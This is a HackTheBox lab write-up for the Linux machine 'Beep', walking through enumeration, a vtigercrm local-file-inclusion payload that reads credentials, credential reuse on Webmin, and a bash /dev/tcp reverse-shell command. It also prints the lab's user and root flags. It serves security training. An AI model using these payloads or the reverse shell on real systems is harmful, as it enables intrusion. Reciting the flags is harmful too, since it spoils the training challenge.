@@ -1,0 +1,185 @@
+---
+layout: writeup
+title: "Beep"
+date: 2026-03-27
+
+platform: HackTheBox
+difficulty: Easy
+os: Linux
+status: Retired
+
+stuck_summary: "Spent way too long fuzzing parameters on the wrong pages — when it could have been done by searching the EDB ID, and the SSL/TLS issues on this box made everything harder than it needed to be."
+
+tags:
+  - linux
+  - lfi
+  - elastix
+  - freepbx
+  - vtigercrm
+  - webmin
+  - edb-37637
+  - credential-reuse
+---
+
+## TL;DR
+
+```bash
+# Enable TLS 1.0 in Firefox about:config (security.tls.version.min = 1)
+# LFI via vtigercrm
+https://10.10.10.X/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
+
+# SSH with recovered creds
+ssh root@10.10.10.X -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa
+
+# Or reverse shell via Webmin scheduled command (port 10000)
+bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+```
+
+---
+
+## Given Info
+
+**Box description:** Beep is a Linux box running Elastix, a VoIP/PBX platform. It has a large attack surface with many open ports and multiple web applications, most of which share the same credentials.
+
+**Recommended modules:**
+- File Inclusion / Path Traversal
+- Credential reuse
+- Webmin exploitation
+
+---
+
+## Where I Got Stuck
+
+> Be honest here. This is the most valuable section for other people.
+
+- The box runs an ancient SSL/TLS version — Firefox refuses to load it by default. Had to set `security.tls.version.min` to `1` and enable legacy DH cipher suites in `about:config`. This isn't documented anywhere obvious and cost a lot of time.
+- Gobuster on port 80 failed due to 302 redirects. The real site is on port 443 HTTPS — but the SSL issue above meant nothing loaded until the Firefox config was fixed.
+- Fuzzed `index.php`, `config.php`, and `register.php` for LFI parameters — none of them had anything. The actual LFI is in `/vtigercrm/graph.php` which gobuster didn't surface because the path isn't in common wordlists.
+- The LFI path requires `&module=Accounts&action` at the end — without this the page just returns `1` and nothing is displayed. This is only discoverable from EDB-37637, not through manual fuzzing.
+- The null byte `%00` is required in the URL for the file inclusion to work on this PHP version.
+- Tried SSH as `admin` and `asteriskuser` with the recovered password — only `root` worked, and only on Webmin (port 10000), not SSH directly.
+
+---
+
+## Enumeration
+
+### Nmap
+
+```bash
+nmap -sC -sV 10.10.10.X
+```
+
+**Results:**
+
+```
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+25/tcp    open  smtp?
+80/tcp    open  http       Apache httpd 2.2.3
+110/tcp   open  pop3?
+111/tcp   open  rpcbind    2 (RPC #100000)
+143/tcp   open  imap?
+443/tcp   open  ssl/https?
+993/tcp   open  imaps?
+995/tcp   open  pop3s?
+3306/tcp  open  mysql?
+4445/tcp  open  upnotifyp?
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+```
+
+**Interesting findings:**
+- Port 443 running Elastix — main attack target
+- Port 10000 running Webmin 1.570 — useful for post-exploitation
+- SSH on 22 uses old key exchange — requires legacy flags to connect
+- Large attack surface with mail, MySQL, and RPC services
+
+### Gobuster
+
+```bash
+gobuster dir -u https://10.10.10.X/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html -k
+```
+
+**Results:**
+- `/admin` — FreePBX 2.8.1.4 panel (requires auth)
+- `/mail` — RoundCube webmail (requires auth)
+- `/panel` — Flash Operator Panel (Flash, dead end)
+- `/config.php` — Elastix login redirect
+- `/vtigercrm` — Not found by gobuster, known from EDB-37637
+
+---
+
+## Attack Plan
+
+### Option A: Parameter fuzzing on root PHP files ✗
+
+**Why you tried it:** Gobuster found `config.php`, `index.php`, and `register.php` — all reasonable LFI candidates.
+
+1. Fuzzed all three with ffuf:
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u https://10.10.10.X/index.php?FUZZ=value -fs 1785 -k
+```
+Result: No parameters found across all three files.
+
+**Why it failed:** The vulnerable parameter is in `/vtigercrm/graph.php`, a bundled CRM application not surfaced by standard wordlists. Without knowing to look for vtigercrm specifically, manual fuzzing won't find it.
+
+---
+
+### Option B: LFI via vtigercrm (EDB-37637) ✓
+
+**Why this worked:** Elastix bundles vtigercrm, which has a known LFI in `graph.php` via the `current_language` parameter. The full URL format including `&module=Accounts&action` is required for the file contents to be returned.
+
+1. Read `/etc/amportal.conf` via LFI:
+```
+https://10.10.10.X/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
+```
+Result: Full FreePBX config file returned including credentials.
+
+```
+AMPDBUSER=asteriskuser
+AMPDBPASS=jEhdIekWmdjE
+AMPMGRUSER=admin
+AMPMGRPASS=jEhdIekWmdjE
+ARI_ADMIN_USERNAME=admin
+ARI_ADMIN_PASSWORD=jEhdIekWmdjE
+```
+
+2. Logged into Elastix at `https://10.10.10.X/` with `admin:jEhdIekWmdjE` — success.
+
+3. Logged into Webmin at `https://10.10.10.X:10000/` with `root:jEhdIekWmdjE` — success.
+
+---
+
+## Post Exploitation / Privilege Escalation
+
+No privilege escalation needed — Webmin is running as root.
+
+1. Set up listener:
+```bash
+nc -lvnp 4444
+```
+
+2. Created a scheduled command in Webmin (Others → Scheduled Commands) running as `root`:
+```bash
+bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+```
+
+Result: Root shell obtained directly. No privesc required.
+
+---
+
+## Flags
+
+<details>
+<summary>🚩 User Flag — click to reveal</summary>
+
+6c07c68e6880c387273f25055263d076
+
+</details>
+
+<details>
+<summary>🚩 Root Flag — click to reveal</summary>
+
+076624c7a82807483e4c26a9d991fbcd
+
+</details>
